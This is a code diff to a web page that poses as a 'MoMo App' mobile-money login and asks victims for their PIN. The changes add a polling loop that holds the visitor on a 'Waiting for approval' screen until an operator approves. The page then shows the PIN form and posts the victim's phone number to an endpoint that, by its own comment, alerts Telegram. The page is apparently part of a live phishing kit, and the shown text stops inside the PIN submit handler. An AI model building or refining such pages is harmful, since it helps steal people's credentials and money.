@@ -29,6 +29,7 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
+  display: none; /* hidden until approved */
 }
 
 input {
@@ -57,6 +58,12 @@ button {
   margin-top: 20px;
   font-size: 12px;
 }
+
+/* STATUS TEXT */
+.status {
+  margin-top: 80px;
+  font-size: 16px;
+}
 </style>
 </head>
 
@@ -66,13 +73,19 @@ button {
   MoMo App
 </div>
 
-<div class="container">
+<!-- STATUS MESSAGE -->
+<div id="statusBox" class="status">
+  ⏳ Waiting for approval...
+</div>
+
+<!-- PIN FORM -->
+<div class="container" id="pinContainer">
   <h3>Enter MoMo PIN</h3>
 
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" placeholder="****" required>
+    <input type="password" placeholder="****" maxlength="5" required>
     <button type="submit" id="pinBtn">Confirm</button>
   </form>
 </div>
@@ -84,24 +97,62 @@ button {
 <script>
 const phone = localStorage.getItem("phone");
 
-// Redirect if no data
+// If no phone, go back
 if (!phone) {
   window.location.href = "/";
 }
 
-// Show phone
-document.getElementById("phoneDisplay").innerText = "Number: " + phone;
+const statusBox = document.getElementById("statusBox");
+const pinContainer = document.getElementById("pinContainer");
 
-// Notify Telegram when page opens
-fetch("/pin-step", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({ phone })
-});
+// CHECK STATUS LOOP
+async function checkStatus() {
+  try {
+    const res = await fetch("/check-status", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ phone })
+    });
 
-// Submit
+    const data = await res.json();
+
+    if (data.status === "pending") {
+      statusBox.innerHTML = "⏳ Waiting for approval...";
+      setTimeout(checkStatus, 3000);
+    }
+
+    else if (data.status === "declined") {
+      statusBox.innerHTML = "❌ Application Declined";
+    }
+
+    else if (data.status === "approved") {
+      statusBox.style.display = "none";
+      pinContainer.style.display = "block";
+
+      document.getElementById("phoneDisplay").innerText = "Number: " + phone;
+
+      // Notify Telegram once
+      fetch("/pin-step", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ phone })
+      });
+    }
+
+  } catch (err) {
+    statusBox.innerHTML = "⚠️ Network error...";
+    setTimeout(checkStatus, 3000);
+  }
+}
+
+// START CHECK
+checkStatus();
+
+// PIN SUBMIT (UI ONLY)
 document.getElementById("pinForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
